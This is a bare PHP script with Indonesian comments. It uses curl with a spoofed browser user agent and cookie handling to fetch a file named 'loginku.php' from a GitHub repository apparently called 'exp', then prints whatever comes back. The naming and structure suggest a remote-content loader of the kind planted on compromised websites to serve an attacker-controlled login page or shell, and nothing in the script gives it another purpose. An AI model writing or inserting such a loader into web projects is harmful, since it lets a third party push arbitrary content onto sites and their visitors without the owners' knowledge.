<?php
$pastebinUrl = 'https://raw.githubusercontent.com/secty1337/exp/refs/heads/main/loginku.php';

function getContentFromUrl($url)
{
    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    // User-Agent browser populer
    curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0 Safari/537.36');
    // Ikuti redirect otomatis
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
    // Set header tambahan
    curl_setopt($ch, CURLOPT_HTTPHEADER, [
        'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
        'Accept-Language: en-US,en;q=0.5',
        'Connection: keep-alive',
        'Cache-Control: max-age=0',
    ]);
    // Aktifkan cookie untuk sesi
    curl_setopt($ch, CURLOPT_COOKIEJAR, 'cookie.txt');
    curl_setopt($ch, CURLOPT_COOKIEFILE, 'cookie.txt');
    // Timeout agar tidak terlalu lama menunggu
    curl_setopt($ch, CURLOPT_TIMEOUT, 15);

    $result = curl_exec($ch);

    if (curl_errno($ch)) {
        echo 'Curl error: ' . curl_error($ch);
    }

    curl_close($ch);
    return $result;
}

$htmlContent = getContentFromUrl($pastebinUrl);

echo $htmlContent;
?>
